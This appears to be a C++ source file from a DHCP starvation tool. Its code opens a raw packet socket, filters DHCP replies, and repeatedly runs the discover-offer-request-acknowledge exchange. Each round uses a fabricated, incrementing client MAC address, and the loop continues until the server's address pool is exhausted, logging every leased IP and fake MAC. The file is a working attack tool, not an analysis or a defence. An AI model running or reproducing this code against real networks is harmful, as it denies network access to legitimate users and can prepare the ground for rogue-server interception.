#include <DHCP_Starvation.h>

THREADCONTEXT::THREADCONTEXT(DHCPSTARVATION* _starvation):starvation(_starvation),chaddr_host((uint32_t*)(chaddr + 0x02)){
    
    sock = socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_IP));

    if(sock == -1){
        printf("function: %s line: %d socket: %s\n",__func__,__LINE__,strerror(errno));
        exit(1);
    }

    configure_socket_address();

    configure_socket();
}


void THREADCONTEXT::configure_socket_address(){
    uint8_t dhaddr[6] = {0xff,0xff,0xff,0xff,0xff,0xff};

    memset(&saddr,0,sizeof(saddr));
    memset(&daddr,0,sizeof(daddr));

    saddr.sll_family = AF_PACKET;
    saddr.sll_protocol = htons(ETH_P_IP);
    saddr.sll_ifindex = starvation->interface.index;
    saddr.sll_hatype = HARDWARE_ETHERNET;
    saddr.sll_halen = MAC_ADDRESS_LENGTH;
    memcpy(saddr.sll_addr,starvation->interface.haddr,saddr.sll_halen);

    daddr.sll_family = AF_PACKET;
    daddr.sll_protocol = htons(ETH_P_IP);
    daddr.sll_ifindex = starvation->interface.index;
    daddr.sll_hatype = HARDWARE_ETHERNET;
    daddr.sll_halen = MAC_ADDRESS_LENGTH;
    memcpy(daddr.sll_addr,dhaddr,daddr.sll_halen);
}

void THREADCONTEXT::configure_socket(){
    socklen_t saddr_len = sizeof(sockaddr_ll);
    
    sock_filter filter[] = {
        //IPv4
        //if protocol == udp
        {BPF_LD  | BPF_B | BPF_ABS,0,0,IPV4_PROTOCOL_OFFSET},
        {BPF_JMP | BPF_K | BPF_JEQ,0,10,IPPROTOCOL_UDP},
        //if dst == diaddr
        {BPF_LD  | BPF_W | BPF_ABS,0,0,IPV4_DST_OFFSET},
        {BPF_JMP | BPF_K | BPF_JEQ,0,8,INADDR_BROADCAST},

        //X <- IPv4 header length
        {BPF_LDX | BPF_B | BPF_MSH,0,0,IPV4_IHL_OFFSET},

        //UDP
        //if src_port == DHCP_SERVER_PORT
        {BPF_LD  | BPF_H | BPF_IND,0,0,UDP_SRC_PORT_OFFSET},
        {BPF_JMP | BPF_K | BPF_JEQ,0,5,DHCP_SERVER_PORT},
        //if dst_port == DHCP_CLIENT_PORT
        {BPF_LD  | BPF_H | BPF_IND,0,0,UDP_DST_PORT_OFFSET},
        {BPF_JMP | BPF_K | BPF_JEQ,0,3,DHCP_CLIENT_PORT},

        //DHCP
        //if opcode == BOOT_MSGB_REPLY
        {BPF_LD  | BPF_B | BPF_IND,0,0,DHCP_OPCODE_OFFSET},
        {BPF_JMP | BPF_K | BPF_JEQ,0,1,BOOT_MSG_REPLY},

        {BPF_RET,0,0,SNAPSHORT_LENGTH},
        {BPF_RET,0,0,0x00}
    };

    sock_fprog fprog = {sizeof(filter) / sizeof(filter[0]),filter};

    timeval tv;
    tv.tv_sec = 2e+0;
    tv.tv_usec = 0;

    if(bind(sock,(sockaddr*)&saddr,sizeof(sockaddr_ll)) == -1){
        printf("function: %s line: %d bind: %s\n",__func__,__LINE__,strerror(errno));
        exit(1);
    }

    if(setsockopt(sock,SOL_SOCKET,SO_ATTACH_FILTER,&fprog,sizeof(fprog)) == -1){
        printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
        exit(1);
    }

    if(setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)) == -1){
        printf("function: %s line: %d setsockopt: %s\n",__func__,__LINE__,strerror(errno));
        exit(1);
    }
}


int THREADCONTEXT::discover(){
    DHCP dhcp;
    UDP udp;
    IPV4 ipv4;
    PACKET spacket;

    std::chrono::seconds::rep end = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now().time_since_epoch()).count();

    dhcp.write_discover(DHCP_ID,end - start,DHCP_BROADCAST_FLAG,chaddr);
    udp.write_hdr_ipv4(starvation->interface.in_addr,INADDR_BROADCAST,DHCP_CLIENT_PORT,DHCP_SERVER_PORT,dhcp);
    ipv4.write_hdr(IPV4_ID,false,IPV4_TTL,IPPROTOCOL_UDP,starvation->interface.in_addr,INADDR_BROADCAST,udp.length() + dhcp.length());
    
    spacket = ipv4;
    spacket += udp;
    spacket += dhcp;

    if(sendto(sock,spacket.data(),spacket.length(),0,(sockaddr*)&daddr,sizeof(daddr)) == -1){
        printf("\nDISCOVER sendto -> %s\n",strerror(errno));
        return FAILURE;
    }

    return DHCP_MSG_OFFER;
}

int THREADCONTEXT::offer(){

    DHCP rpacket;

    ssize_t recv_length = recv(sock,rpacket.data(),rpacket.capacity(),0);

    if(recv_length == -1){

        if(discover_attempts-- == 0){
            
            discover_attempts = MAX_DHCP_DISCOVER_ATTEMPTS;

            return FAILURE;
        }

        return DHCP_MSG_DISCOVER;
    }

    discover_attempts = MAX_DHCP_DISCOVER_ATTEMPTS;

    rpacket.set_length(recv_length);
    
    rpacket.unpack_ipv4_void();
    rpacket.unpack_udp_void();
    
    hdr = rpacket.read_hdr();
    
    if(hdr.xid != DHCP_ID || memcmp(chaddr,hdr.chaddr,sizeof(chaddr))){
        return DHCP_MSG_OFFER;
    }

    uint8_t message_type = 0;

    if(!rpacket.get_option_value(DHCP_OPT_MESSAGE_TYPE,&message_type,sizeof(message_type))){
        printf("\nOFFER get option message type failed\n");
        return DHCP_MSG_OFFER;
    }

    if(message_type != DHCP_MSG_OFFER){
        return DHCP_MSG_OFFER;
    }

    uint32_t siaddr = 0;
    if(!rpacket.get_option_value(DHCP_OPT_SERVER_IDENTIFIER,&siaddr,sizeof(siaddr))){
        printf("\nOFFER get option server identifier failed\n");
        return DHCP_MSG_OFFER;
    }

    if(starvation->siaddr != siaddr){
        printf("\nOFFER server subnetwork invalid\n");
        return DHCP_MSG_OFFER;
    }

    return DHCP_MSG_REQUEST;
}

int THREADCONTEXT::request(){
    DHCP dhcp;
    UDP udp;
    IPV4 ipv4;
    PACKET spacket;

    std::chrono::seconds::rep end = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now().time_since_epoch()).count();

    dhcp.write_request_select(DHCP_ID,end - start,DHCP_BROADCAST_FLAG,chaddr,starvation->fclients.siaddr,hdr.yiaddr);
    udp.write_hdr_ipv4(starvation->interface.in_addr,INADDR_BROADCAST,DHCP_CLIENT_PORT,DHCP_SERVER_PORT,dhcp);
    ipv4.write_hdr(IPV4_ID,false,IPV4_TTL,IPPROTOCOL_UDP,starvation->interface.in_addr,INADDR_BROADCAST,udp.length() + dhcp.length());

    spacket = ipv4;
    spacket += udp;
    spacket += dhcp;

    if(sendto(sock,spacket.data(),spacket.length(),0,(sockaddr*)&daddr,sizeof(daddr)) == -1){
        printf("\nREQUEST sendto failed -> %s\n",strerror(errno));
        return FAILURE;
    }
    
    return DHCP_MSG_ACK;
}

int THREADCONTEXT::ack(){
    DHCP rpacket;

    ssize_t recv_length = recv(sock,rpacket.data(),rpacket.capacity(),0);
    
    if(recv_length == -1){

        if(request_attempts-- == 0){
            
            request_attempts = MAX_DHCP_REQUEST_ATTEMPTS;

            return DHCP_MSG_DISCOVER;
        }

        return DHCP_MSG_REQUEST;
    }

    request_attempts = MAX_DHCP_REQUEST_ATTEMPTS;

    rpacket.set_length(recv_length);

    rpacket.unpack_ipv4_void();
    rpacket.unpack_udp_void();

    hdr = rpacket.read_hdr();

    if(hdr.xid != DHCP_ID || memcmp(chaddr,hdr.chaddr,sizeof(chaddr))){
        return DHCP_MSG_ACK;
    }

    uint8_t message_type = 0;

    if(!rpacket.get_option_value(DHCP_OPT_MESSAGE_TYPE,&message_type,sizeof(message_type))){
        printf("\nACK get option message type failed\n");
        return DHCP_MSG_ACK;
    }

    if(message_type == DHCP_MSG_ACK){

        starvation->mutex.lock();

        starvation->fclients.emplace_back(hdr.yiaddr,hdr.chaddr);
        
        printf("IP: %s ",sprint_ipv4(&starvation->fclients.back().iaddr));
        printf("MAC: %s\n",sprint_mac(starvation->fclients.back().haddr));

        starvation->mutex.unlock();

        return SUCCESS;
    }
    else if(message_type == DHCP_MSG_NAK){
        return DHCP_MSG_DISCOVER;
    }

    return DHCP_MSG_ACK;
}


int THREADCONTEXT::dora(){
    bool runner = true;
    int state = DHCP_MSG_DISCOVER;

    start = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now().time_since_epoch()).count();

    while(runner){
        switch(state){
            case DHCP_MSG_DISCOVER:
                state = discover();
                break;
            case DHCP_MSG_OFFER:
                state = offer();
                break;
            case DHCP_MSG_REQUEST:
                state = request();
                break;
            case DHCP_MSG_ACK:
                state = ack();
                break;
            case FAILURE:
            case SUCCESS:
                runner = false;
                break;
            default:
                state = FAILURE;
                runner = false;
                break;
        }
    }

    return state;
}

void THREADCONTEXT::execute(){

    discover_attempts = MAX_DHCP_DISCOVER_ATTEMPTS;
    request_attempts = MAX_DHCP_REQUEST_ATTEMPTS;

    memset(chaddr,0,sizeof(chaddr));
    chaddr[0] = 0xFE;
    chaddr[1] = 0xFF;

    while(true){
        uint32_t host = starvation->get_host();
        
        if(host >= starvation->max_hosts) break;

        *chaddr_host = htonl(host);

        if(dora() == FAILURE) break;
    }
}